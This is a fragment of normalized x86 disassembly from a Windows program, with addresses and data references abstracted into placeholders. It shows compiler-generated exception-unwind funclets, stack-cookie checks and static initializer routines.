lea esi [ ebp - 0xb0 ]
jmp sub_429950
sub_45b29b
lea esi [ ebp - 0xcc ]
jmp sub_429950
sub_45b2a6
lea esi [ ebp - 0xe8 ]
jmp sub_429950
sub_45b2b1
lea esi [ ebp - 0x13c ]
jmp sub_429950
sub_45b2bc
lea esi [ ebp - 0x120 ]
jmp sub_429950
sub_45b2c7
lea esi [ ebp - 0x104 ]
jmp sub_429950
sub_45b2d2
lea esi [ ebp - 0x120 ]
jmp sub_429950
sub_45b2dd
lea esi [ ebp - 0x13c ]
jmp sub_429950
sub_45b2e8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x150 ]
mov ecx [ edx - 0x154 ]
xor ecx eax
call sub_43f96b
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b320
mov eax [ ebp + 0x4 ]
push eax
call sub_423660
retn
sub_45b32a
mov eax [ ebp - 0x10 ]
jmp sub_40f8c0
sub_45b332
mov eax [ ebp + 0x4 ]
jmp sub_40f8c0
sub_45b33a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b360
mov eax [ ebp + 0x4 ]
jmp sub_40da60
sub_45b368
mov eax [ ebp + 0x4 ]
add eax 0x24
jmp sub_423400
sub_45b373
mov eax [ ebp + 0x4 ]
add eax 0x90
push eax
call sub_402e30
retn
sub_45b382
mov esi [ ebp + 0x4 ]
add esi 0x170
jmp sub_40f550
sub_45b390
mov eax [ ebp + 0x4 ]
add eax 0x18c
jmp sub_40dd60
sub_45b39d
mov esi [ ebp + 0x4 ]
add esi 0x514
jmp sub_40e190
sub_45b3ab
mov eax [ ebp + 0x4 ]
add eax 0x910
jmp sub_40e510
sub_45b3b8
mov esi [ ebp + 0x4 ]
add esi 0xd2c
jmp sub_4221e0
sub_45b3c6
mov eax [ ebp - 0x10 ]
jmp sub_40f8c0
sub_45b3ce
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b3f0
mov eax [ ebp + 0x4 ]
jmp sub_41dfd0
sub_45b3f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b420
mov eax [ ebp + 0x4 ]
jmp sub_40da60
sub_45b428
mov eax [ ebp + 0x4 ]
add eax 0x24
jmp sub_423400
sub_45b433
mov eax [ ebp + 0x4 ]
add eax 0x90
push eax
call sub_402e30
retn
sub_45b442
mov esi [ ebp + 0x4 ]
add esi 0x170
jmp sub_40f550
sub_45b450
mov eax [ ebp + 0x4 ]
add eax 0x18c
jmp sub_40dd60
sub_45b45d
mov esi [ ebp + 0x4 ]
add esi 0x514
jmp sub_40e190
sub_45b46b
mov eax [ ebp + 0x4 ]
add eax 0x910
jmp sub_40e510
sub_45b478
mov esi [ ebp + 0x4 ]
add esi 0xd2c
jmp sub_4221e0
sub_45b486
mov eax [ ebp + 0x4 ]
add eax 0xe4c
push eax
call sub_426670
retn
sub_45b495
mov esi [ ebp + 0x4 ]
add esi 0xe70
jmp sub_40f780
sub_45b4a3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x20 ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b4c0
mov eax [ ebp + 0x4 ]
push eax
call sub_41e010
retn
sub_45b4ca
mov esi [ ebp + 0x4 ]
add esi 0x180
jmp sub_4221e0
sub_45b4d8
mov esi [ ebp + 0x4 ]
add esi 0x1d4
jmp sub_4221e0
sub_45b4e6
mov esi [ ebp + 0x4 ]
add esi 0x228
jmp sub_4221e0
sub_45b4f4
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b510
lea esi [ ebp - 0xee8 ]
jmp sub_40ea80
sub_45b51b
lea eax [ ebp - 0xeb0 ]
push eax
call sub_40e6e0
retn
sub_45b528
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xef4 ]
mov ecx [ edx - 0xef8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b550
lea esi [ ebp - 0x2e0 ]
jmp sub_41dd90
sub_45b55b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2dc ]
mov ecx [ edx - 0x2e0 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b580
lea esi [ ebp - 0x30 ]
jmp sub_429950
sub_45b588
lea esi [ ebp - 0x304 ]
jmp sub_41dd90
sub_45b593
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x308 ]
mov ecx [ edx - 0x30c ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b5d0
lea esi [ ebp - 0x30 ]
jmp sub_429950
sub_45b5d8
lea esi [ ebp - 0x4c ]
jmp sub_429950
sub_45b5e0
lea esi [ ebp - 0x31c ]
jmp sub_41dd90
sub_45b5eb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x320 ]
mov ecx [ edx - 0x324 ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45b620
call sub_419d10
push sub_45b740
mov [ rw-data ] rw-data
mov [ rw-data ] r--data
call sub_4413c3
pop ecx
retn
sub_45b650
call sub_421350
push j_sub_4209d0
call sub_4413c3
pop ecx
retn
sub_45b6a0
call sub_427500
push sub_45b850
call sub_4413c3
pop ecx
retn
sub_45b6b1
mov ecx rw-data
call sub_43f1f8
push sub_45b8d9
call sub_4413c3
pop ecx
retn
sub_45b6c7
call [ GetProcessHeap@IAT ]
push sub_45b8e3
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] 0x0
call sub_4413c3
pop ecx
retn
sub_45b6ef
push rw-data
mov ecx rw-data
call sub_43f2f9
push sub_45b8ed
call sub_4413c3
pop ecx
retn
sub_45b70a
mov ecx rw-data
call sub_43f6db
push sub_45b8f8
call sub_4413c3
pop ecx
retn
sub_45b720
mov ecx rw-data
call sub_43f761
push sub_45b902
call sub_4413c3
pop ecx
retn
sub_45b7a0
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_43f960
add esp 0x4
sub_45b7e0
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_43f960
add esp 0x4
j_sub_4209d0
jmp sub_4209d0
sub_45b830
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
mov [ rw-data ] 0x0
call [ DeleteDC@IAT ]
sub_45b8d9
mov ecx rw-data
jmp sub_43f191
sub_45b8e3
mov ecx rw-data
jmp sub_43f238
sub_45b8ed
mov [ rw-data ] r--data
retn
sub_45b8f8
mov ecx rw-data
jmp sub_43f703
sub_45b902
mov ecx rw-data
jmp sub_43f71d
sub_45b90c
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_43fb60
